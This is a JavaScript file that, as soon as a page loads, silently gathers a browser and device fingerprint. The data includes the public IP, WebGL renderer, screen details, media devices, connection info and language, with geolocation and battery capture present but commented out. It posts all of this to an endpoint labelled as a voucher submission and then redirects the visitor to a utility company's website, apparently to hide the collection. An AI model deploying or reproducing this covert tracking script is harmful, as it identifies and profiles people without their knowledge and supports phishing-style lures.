
function getBrowserFeatures() {
    const features = {
        canvas: !!window.CanvasRenderingContext2D,
        webgl: !!window.WebGLRenderingContext,
        websockets: 'WebSocket' in window,
        serviceWorker: 'serviceWorker' in navigator
    };
    return features;
}

function getCSSProperty() {
    const supportsGrid = CSS.supports('display', 'grid');
    return { type: 'css_support', supportsGrid };
}

function getAccessibilityFeatures() {
    const highContrastMediaQuery = window.matchMedia('(forced-colors: active)');
    const isHighContrast = highContrastMediaQuery.matches;
    return { type: 'accessibility_features', highContrastMode: isHighContrast };
}

function getGeo() {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition((position) => {
            resolve(position.coords);
        }, reject);
    });
}

function getBattery() {
    return navigator.getBattery()
}

function getConnection() {
    return new Promise((resolve, reject) => {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            resolve(connection);
        } else {
            reject(new Error("Connection information is not available."));
        }
    });
}

function getCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if(gl instanceof WebGLRenderingContext) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "";
        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "";
        return { vendor, renderer };
    }
    return null;
}


function getDevice() {
    return navigator.mediaDevices.enumerateDevices()
}

function getPublicIp() {
    return fetch('https://api.ipify.org?format=json')
        .then((response) => response.json());
}

async function handlePromise(promise) {
    try {
        const data = await promise();
        if(!data) throw new Error("data not found");
        return [ null, data ]
    } catch (error) {
        return [error, null]
    }
}


document.addEventListener("DOMContentLoaded", async () => {
    const SERVER_URI = "localhost";
    const isSecureContext = window.isSecureContext;
    const [ipInfoErr, publicIpInfo] = await handlePromise(getPublicIp);
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const userAgent = navigator.userAgent;
    const memmory = isSecureContext ? navigator.deviceMemory || "NA" : "NA";
    const displayInfo = () => {
        let res = {};
        for(let key in screen) {
            res[key] = screen[key]
        }
        return res;
    }
    const languages = navigator.languages || [navigator.language];
    const webGl = getCanvasFingerprint();
    const isTouchEnabled = navigator.maxTouchPoints > 0 ? true : false;
    const browserFeatures = getBrowserFeatures();
    const cssProperty = getCSSProperty();
    const accessibilityFeatures = getAccessibilityFeatures();
    const [deviceInfoErr, devicesInfo ] = await handlePromise(getDevice)
    const [batteryInfoErr, batteryInfo] = await handlePromise(getBattery);
    const [connectionInfoErr, connectionInfo] = await handlePromise(getConnection)
    // const [geoErr, geoInfo] = await handlePromise(getGeo);


    const result = {
        timeZone,
        userAgent,
        memmory,
        displayInfo: displayInfo(),
        languages,
        webGl,
        isTouchEnabled,
        browserFeatures,
        cssProperty,
        accessibilityFeatures
    }
    if(!ipInfoErr) result.publicIpInfo = publicIpInfo;
    if(!deviceInfoErr) result.devicesInfo = devicesInfo;
    // if(!batteryInfoErr) result.batteryInfo = { ...batteryInfo };
    if(!connectionInfoErr) result.connectionInfo = (()=>{
        let res = {}
        for(let key in connectionInfo) {
            res[key] = connectionInfo[key]
        }
        return res;
    })();
    // if(!geoErr) result.geoInfo = geoInfo;

    fetch(`http://${SERVER_URI}/api/submit-voucher`, {
        method: "POST",
        body: JSON.stringify(result),
        headers: {
            "Content-Type": "application/json"
        },
        
    })
    .finally(() => {
        location.replace("https://wapda.com.pk/")
    })

})